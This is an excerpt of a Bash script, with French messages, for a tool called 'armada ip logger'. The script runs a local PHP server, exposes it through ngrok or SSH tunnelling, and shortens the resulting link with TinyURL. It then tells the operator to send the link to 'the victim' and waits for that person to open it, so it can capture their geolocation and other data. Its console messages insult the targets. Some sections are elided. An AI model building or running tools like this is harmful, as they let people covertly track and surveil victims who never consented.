...
command -v php > /dev/null 2>&1 || { echo >&2 "Installe php mec."; exit 1; }
...
getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]  Geolocation ...\e[0m\n"
while [ true ]; do


if [[ -e "server/geolocate.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Geolocation trouver!\n"
catch_cred

fi
sleep 0.5
if [[ -e "server/error.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Erreur avec geo n!\n"
checkerror=$(grep -o 'Error:.*' server/error.txt | cut -d " " -f2 | tr -d ' ' )
if [[ $checkerror == 1 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] l'enculer a refuser la geolocalisation...\e[0m\n"

rm -rf server/error.txt
getcredentials
elif [[ $checkerror == 2 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] bref ...\e[0m\n"

rm -rf server/error.txt
getcredentials
elif [[ $checkerror == 3 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] oops ...\e[0m\n"

rm -rf server/error.txt
getcredentials
elif [[ $checkerror == 4 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] errreur inconnue ...\e[0m\n"
...
##
serverx() {
printf "\e[1;92m[\e[0m*\e[1;92m] le server php s'allume...\n"
php -t "server/" -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] ssh s'allume...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "Installe ssh mec"; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
...
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] voici ton lien bg:\e[0m\e[1;77m %s \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] voilaaa avec tinymerde:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
checkfound
...
printf "\e[1;92m[\e[0m*\e[1;92m] installement de jq...\n"
...
printf "\e[1;92m[\e[0m*\e[1;92m] installement de  Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
command -v wget > /dev/null 2>&1 || { echo >&2 "install curl bg."; exit 1; }
...
printf "\e[1;93m[!] oups, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi
...
command -v unzip > /dev/null 2>&1 || { echo >&2 "Install ngrok bg."; exit 1; }
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] erreur... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m*\e[1;92m] php server qui commence...\n"
php -t "server/" -S 127.0.0.1:8080 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m]  ngrok server...\n"
...
printf "\e[1;92m[\e[0m*\e[1;92m] envoie sa a la victim:\e[0m\e[1;77m %s\e[0m\n" $send_link
...
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] attend que le con ouvre le lien...\e[0m\n"
while [ true ]; do
...
printf "\e[1;93m  armada ip logger                                                \e[0m\n"
